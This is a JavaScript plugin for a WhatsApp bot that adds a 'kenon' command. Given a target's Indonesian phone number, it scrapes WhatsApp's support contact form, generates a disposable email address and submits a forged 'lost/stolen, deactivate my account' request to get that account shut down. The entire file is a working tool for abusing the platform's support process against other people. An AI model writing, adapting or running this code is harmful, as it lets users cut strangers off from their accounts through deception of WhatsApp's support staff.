let axios = require("axios")
let cheerio = require("cheerio")
let PhoneNumber = require("awesome-phonenumber")

let handler = async (m, { conn, text, command }) => {
	if (!text) {
		return conn.reply(m.chat, "• *Example :* .kenon +6288xxxxxxxxx", m)
	}
	if (text == nomorown) {
	    return conn.reply(m.chat, "Tidak Bisa Kenon Nomer Owner!", m)
	}
	conn.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
	text = text.replace(/[^0-9]/g, "");
	if (!(text.startsWith("08") || text.startsWith("62"))) {
		return conn.reply(m.chat, "Bot can only handle Indonesian numbers.", m)
	}

	text = text.startsWith("08") ? text.replace("08", "62") : text;
	if (text + "@s.whatsapp.net" === conn.user.jid) {
		return conn.reply(m.chat, "Looks like you entered the Bot number.", m)
	}

	const isValid = await conn.onWhatsApp(text + "@s.whatsapp.net");
	if (isValid.length == 0) {
		return conn.reply(m.chat, "The number you input is not registered on Whatsapp, please try again.", m)
	}

	text = text.trim();

	try {
		const data = await axios.get("https://www.whatsapp.com/contact/noclient/");
		const email = await axios.get(
			"https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
		);
		const cookie = data.headers["set-cookie"] || ""
		const $ = cheerio.load(data.data);
		const $form = $("form");
		const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
		let form = new URLSearchParams();
		form.append("jazoest", $form.find("input[name=jazoest]").val());
		form.append("lsd", $form.find("input[name=lsd]").val());
		form.append("step", "submit");
		form.append("country_selector", "INDONESIA");

		text = PhoneNumber("+" + text).getNumber("international");
		form.append("phone_number", `${text}`);
		form.append("email", email.data[0]);
		form.append("email_confirm", email.data[0]);
		form.append("platform", "ANDROID");
		form.append("your_message", "Perdido/roubado: desative minha conta");
		form.append("__user", "0");
		form.append("__a", "1");
		form.append("__csr", "");
		form.append("__req", "8");
		form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
		form.append("dpr", "1");
		form.append("__ccg", "UNKNOWN");
		form.append("__rev", "1006630858");
		form.append("__comment_req", "0");

		const res = await axios({
			url,
			method: "POST",
			data: form,
			headers: {
				cookie,
			},
		});
		const payload = String(res.data);

		if (payload.includes(`"payload":true`)) {
			conn.reply(m.chat, 
				`WhatsApp Support
Hi,
Thank you for your message.
We have deactivated your WhatsApp account.`, m)
		} else if (payload.includes(`"payload":false`)) {
			conn.reply(m.chat, 
				`Thank you for contacting us.
We ll get back to you via email, and it may take up to three business days.`, m)
		} else conn.reply(m.chat, await import("utils").format(res.data), m)
	} catch (err) {
		conn.reply(m.chat, `${err}`, m)
	}
};

handler.help = ['kenon *<number>*']
handler.tags = ['bug']
handler.command = /^(kenon)$/i
handler.owner = false
handler.premium = true

module.exports = handler